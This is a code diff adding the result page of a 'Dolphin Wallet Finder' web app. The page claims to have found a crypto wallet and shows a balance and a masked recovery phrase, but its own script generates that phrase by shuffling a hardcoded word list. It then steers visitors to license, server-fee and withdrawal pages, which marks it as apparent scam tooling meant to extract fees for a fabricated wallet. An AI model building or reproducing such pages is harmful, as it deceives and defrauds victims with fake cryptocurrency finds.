@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dolphin Wallet Finder — Scan Result</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet">
+
+  <style>
+  :root{
+    --c1:#0ff1e7; --c2:#35a7ff; --c3:#14ff89;
+    --grid:#0e1628;
+    --panel:rgba(10,16,26,.70); --panel2:rgba(6,12,20,.60);
+    --stroke:rgba(64,203,255,.28); --dash:rgba(32,205,255,.20);
+    --muted:rgba(190,245,255,.85); --text:#eafaff;
+    --shadow-lg:0 28px 90px rgba(0,0,0,.65);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0; color:var(--text);
+    font-family:Inter, system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif;
+    background:
+      radial-gradient(1400px 820px at 15% 10%, rgba(53,167,255,.12), transparent 60%),
+      radial-gradient(1100px 680px at 85% 90%, rgba(20,255,137,.12), transparent 60%),
+      linear-gradient(180deg,#0a1220,var(--grid) 42%);
+    overflow-x:hidden; -webkit-tap-highlight-color:transparent;
+  }
+
+  .radar{position:fixed; inset:0; z-index:-2}
+  canvas{position:absolute; inset:0; width:100%; height:100%}
+
+  .stage{min-height:100%; display:grid; place-items:center; padding:clamp(16px,3vw,32px); position:relative; z-index:2}
+  .shell{
+    width:min(1200px,98vw); min-height:560px; display:grid; grid-template-columns:1.05fr 1.45fr;
+    border-radius:28px; overflow:hidden; isolation:isolate; position:relative;
+    box-shadow:var(--shadow-lg); border:1px solid var(--stroke);
+    background:linear-gradient(180deg,var(--panel),var(--panel2));
+  }
+  @media (max-width:980px){ .shell{ grid-template-columns:1fr } }
+
+  .brand-pane{
+    position:relative;
+    background:
+      radial-gradient(900px 600px at 20% 10%, rgba(53,167,255,.22), transparent 60%),
+      radial-gradient(700px 520px at 100% 100%, rgba(20,255,137,.20), transparent 65%),
+      linear-gradient(180deg, rgba(12,22,36,.88), rgba(8,16,28,.78));
+    backdrop-filter: blur(18px) saturate(120%);
+    border-right:1px solid rgba(64,203,255,.18);
+    overflow:hidden;
+  }
+  .brand-inner{ padding:34px; height:100%; display:flex; flex-direction:column; gap:18px; justify-content:space-between }
+  .logo-wrap{ position:relative; width:min(240px,42vw); aspect-ratio:1/1; filter: drop-shadow(0 18px 42px rgba(53,167,255,.45)); }
+  .ring{ position:absolute; inset:-12%; border-radius:50%;
+    background:conic-gradient(from 0deg, rgba(53,167,255,.75), transparent 20%, rgba(15,241,231,.75), transparent 70%);
+    filter:blur(12px); animation:spin 8s linear infinite; opacity:.9;
+  }
+  .title{ margin:14px 0 6px; font-weight:900; font-size:clamp(22px,2.2vw,30px);
+    background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent; }
+  .kicker{ color:var(--muted); line-height:1.8 }
+
+  .content-pane{ position:relative; }
+  .border-glow{ position:absolute; inset:-1.5px; border-radius:30px; z-index:-1; background:conic-gradient(from 0deg, transparent, rgba(53,167,255,.55), transparent 40%, rgba(15,241,231,.55), transparent 75%); filter:blur(8px); animation:spin 14s linear infinite; }
+  .pane-inner{ padding:28px clamp(24px,4vw,38px); display:flex; flex-direction:column; gap:18px; height:100% }
+
+  .hero h2{ margin:0; font-size:clamp(22px,2.4vw,32px); font-weight:900; background:linear-gradient(90deg,var(--c2),var(--c1),var(--c3)); -webkit-background-clip:text; color:transparent }
+  .hero p{ color:var(--muted); line-height:1.9; margin:0 }
+
+  /* Responsive stat cards */
+  .stats{ display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:14px; margin-top:6px }
+  .stat{ background:linear-gradient(120deg,rgba(0,255,255,.09),rgba(0,35,80,.14)); border:1px solid rgba(64,203,255,.28); border-radius:14px; padding:14px 18px; min-height:76px; overflow:visible }
+  .stat .n{ font-size:clamp(18px,2.2vw,28px); font-weight:900; color:var(--c1); line-height:1.3; overflow-wrap:anywhere; white-space:normal; word-break:break-word }
+  .stat .l{ color:var(--muted); font-size:.95rem; margin-top:6px; white-space:normal }
+
+  .grid{ display:grid; grid-template-columns:1fr 1fr; gap:16px; margin-top:6px }
+  @media (max-width:980px){ .grid{ grid-template-columns:1fr } }
+  .card{ background:linear-gradient(110deg,rgba(0,255,255,.08),rgba(0,40,110,.13)); border:1px solid rgba(64,203,255,.28); border-radius:16px; padding:18px; display:flex; gap:10px; }
+
+  .actions{ margin-top:20px; display:flex; justify-content:center }
+  .btn-big{ text-align:center; border:none; border-radius:18px; padding:20px 28px; font-size:1.15rem; font-weight:900; letter-spacing:.35px; text-transform:uppercase; color:#001019; background:linear-gradient(95deg,var(--c2),var(--c1),var(--c3),var(--c2)); background-size:220% 100%; box-shadow:0 24px 50px rgba(53,167,255,.30); cursor:pointer; transition:transform .15s ease, background-position .55s ease; min-width:min(320px,90%); }
+  .btn-big:hover{ transform:translateY(-1px); background-position:100% 0 }
+
+  .foot{ margin-top:auto; text-align:center; color:var(--muted); font-size:.9rem }
+  .wallet-info{ color:var(--muted); line-height:1.9 }
+  .wallet-info strong{ color:#cfefff }
+  .mnemonic{ display:grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap:10px }
+  .mnemonic input{ background:#000; border:1px solid var(--stroke); padding:10px; border-radius:8px; color:var(--text); text-align:center; font-family:monospace; font-size:.9em; }
+
+  .logo-wrap img{ width:100%; height:100%; object-fit:contain; display:block; }
+  @media (max-width: 600px){ .logo-wrap{ width:min(180px,60vw); margin:0 auto; } }
+
+  @keyframes spin{ to{ transform:rotate(1turn) } }
+  </style>
+</head>
+<body>
+  <div class="radar"><canvas id="bg"></canvas></div>
+
+  <main class="stage">
+    <section class="shell">
+      <aside class="brand-pane">
+        <div class="brand-inner">
+          <div class="logo-wrap">
+            <div class="ring"></div>
+            <img src="../assets/logo.png" alt="Dolphin Wallet" />
+          </div>
+
+          <div>
+            <div class="title">Dolphin Wallet Finder</div>
+          </div>
+      </aside>
+
+      <section class="content-pane">
+        <div class="border-glow"></div>
+        <div class="pane-inner">
+          <header class="hero">
+            <h2>🎉 Wallet Found</h2>
+            <p id="walletInfo" class="wallet-info"></p>
+            <div class="stats" id="stats">
+              <div class="stat"><div class="n" id="statBalance">—</div><div class="l">Balance</div></div>
+              <div class="stat"><div class="n" id="statNetwork">—</div><div class="l">Network</div></div>
+              <div class="stat"><div class="n" id="statLastTx">—</div><div class="l">Last Tx</div></div>
+            </div>
+          </header>
+
+          <section class="grid">
+            <div class="card" style="flex-direction:column">
+              <strong>Mnemonic</strong>
+              <div class="mnemonic" id="mnemonicWords"></div>
+            </div>
+
+            <div class="card" style="flex-direction:column">
+              <strong>Next Step</strong>
+              <p class="kicker" id="nextStepCopy">Checking license...</p>
+              <div class="actions"><button class="btn-big" id="licenseBtn">Loading...</button></div>
+            </div>
+            <div class="footer">© <span id="year"></span> DOLPHIN WALLET FINDER. All rights reserved.</div>
+        </div>
+          </section>
+        </div>
+      </section>
+    </section>
+  </main>
+
+  <script>
+    const API_BASE_URL = "https://web-production-b86d.up.railway.app/api";
+    const token = localStorage.getItem("token");
+
+    const walletInfoEl = document.getElementById("walletInfo");
+    const licenseBtn = document.getElementById("licenseBtn");
+    const nextStepCopy = document.getElementById("nextStepCopy");
+
+    if (!token) {
+      alert("Please log in first.");
+      window.location.href = "login.html";
+    }
+
+    function setNextStep(text){ nextStepCopy.textContent = text; }
+    function setButton(text, handler){ licenseBtn.textContent = text; licenseBtn.onclick = handler; }
+
+    function formatDateMaybe(value){
+      const s = String(value || '').trim();
+      const d = new Date(s);
+      if (!s) return "—";
+      if (!isNaN(d)) {
+        const iso = d.toISOString().slice(0,19).replace('T',' ');
+        return iso;
+      }
+      return s;
+    }
+
+    function checkLicenseAndSetButton() {
+      fetch(`${API_BASE_URL}/license/status`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.license === "active") {
+          setNextStep("License active. Checking transaction status...");
+          checkTransactionFeeStatus();
+        } else {
+          setNextStep("License inactive. You need to activate your wallet.");
+          setButton("Activate Wallet", () => window.location.href = "license.html");
+        }
+      })
+      .catch(() => {
+        alert("Server error occurred.");
+        setNextStep("Could not verify license status.");
+      });
+    }
+
+    function checkTransactionFeeStatus() {
+      fetch(`${API_BASE_URL}/final-tx`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === "approved") {
+          setNextStep("Transaction approved. Proceed to server.");
+          setButton("Proceed to Server", () => window.location.href = "server-fee.html");
+        } else {
+          setNextStep("Transaction pending. You may withdraw or continue.");
+          setButton("Withdraw Funds", () => window.location.href = "transaction.html");
+        }
+      })
+      .catch(() => {
+        alert("Error checking transaction fee status.");
+        setNextStep("Could not check transaction status.");
+      });
+    }
+
+    function renderMnemonic(words){
+      const maskedIndices = [2,4,5,6,8,10]; // keep your exact masking behavior
+      const wordInputs = words.map((w,i)=>`<input type="text" readonly value="${maskedIndices.includes(i)?'••••••':w}" />`).join("");
+      document.getElementById("mnemonicWords").innerHTML = wordInputs;
+    }
+
+    function loadOrCreateMnemonic(){
+      // 1) Try to get from server
+      fetch(`${API_BASE_URL}/mnemonic`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(async data => {
+        if (Array.isArray(data.words) && data.words.length){
+          renderMnemonic(data.words);
+          return;
+        }
+        // 2) Not found -> create once on first visit (your existing list, 12 words)
+        const allWords = [
+          "trouble","filter","gallery","oxygen","salmon","silent","pistol","bounce","diamond","trigger","planet","furnace",
+          "immune","flee","people","initial","panic","crucial","display","grace","aim","copper","fashion","pelican",
+          "pulp","average","wheel","pride","sketch","flag","narrow","object","juice","victory","swallow","refuse",
+          "goat","dune","phrase","hole","boy","maid","report","exhibit","ride","lecture","dynamic","burger",
+          "fork","disorder","assume","table","dawn","hood","office","art","share","later","sell","paper",
+          "quick","steel","acid","taste","promote","robust","false","hockey","employ","dinner","scene","rain"
+        ];
+        const selected = allWords.sort(() => 0.5 - Math.random()).slice(0, 12);
+
+        // Persist once
+        const saved = await fetch(`${API_BASE_URL}/mnemonic`, {
+          method:'POST',
+          headers: {
+            "Authorization": "Bearer " + token,
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({ words: selected })
+        }).then(r => r.json()).catch(()=>null);
+
+        const finalWords = (saved && Array.isArray(saved.words)) ? saved.words : selected;
+        renderMnemonic(finalWords);
+      })
+      .catch(() => {
+        // fallback, still render random (won't persist)
+        const fallback = ["alpha","beta","gamma","delta","omega","nova","luna","terra","aqua","zen","flux","pulse"];
+        renderMnemonic(fallback);
+      });
+    }
+
+    function loadWalletData() {
+      fetch(`${API_BASE_URL}/my-wallet`, {
+        headers: { "Authorization": "Bearer " + token }
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (!data.wallet) {
+          alert("❌ No wallet found. Please scan first.");
+          window.location.href = "scan.html";
+          return;
+        }
+
+        const wallet = data.wallet;
+        const address = wallet.address || "";
+        const maskedAddress = address ? (address.substring(0, 6) + "••••••••" + address.slice(-4)) : "Unknown";
+
+        walletInfoEl.innerHTML = address ? `<strong>Address:</strong> ${maskedAddress}` : "";
+
+        document.getElementById('statBalance').textContent = wallet.balance ?? '—';
+        document.getElementById('statNetwork').textContent = wallet.network ?? '—';
+        document.getElementById('statLastTx').textContent = formatDateMaybe(wallet.lastTx);
+      })
+      .catch(() => {
+        walletInfoEl.textContent = "❌ Error loading wallet data.";
+      });
+    }
+
+    // init
+    loadWalletData();
+    loadOrCreateMnemonic();
+    checkLicenseAndSetButton();
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // subtle canvas shimmer
+    try{
+      const canvas = document.getElementById('bg');
+      const ctx = canvas.getContext('2d');
+      const dpr = window.devicePixelRatio || 1;
+      let w, h, t = 0;
+      function resize(){ w = canvas.width = innerWidth * dpr; h = canvas.height = innerHeight * dpr; }
+      resize(); addEventListener('resize', resize);
+      (function loop(){
+        t += 0.002;
+        ctx.clearRect(0,0,w,h);
+        ctx.globalAlpha = 0.08;
+        for(let i=0;i<6;i++){
+          ctx.beginPath();
+          const r = Math.max(w,h) * (0.15 + i*0.12 + Math.sin(t+i)*0.01);
+          ctx.arc(w*0.2, h*0.15, r, 0, Math.PI*2);
+          ctx.strokeStyle = `rgba(53,167,255,0.6)`;
+          ctx.lineWidth = 1 * dpr;
+          ctx.stroke();
+        }
+        requestAnimationFrame(loop);
+      })();
+    }catch(e){}
+  </script>
+</body>
+</html>
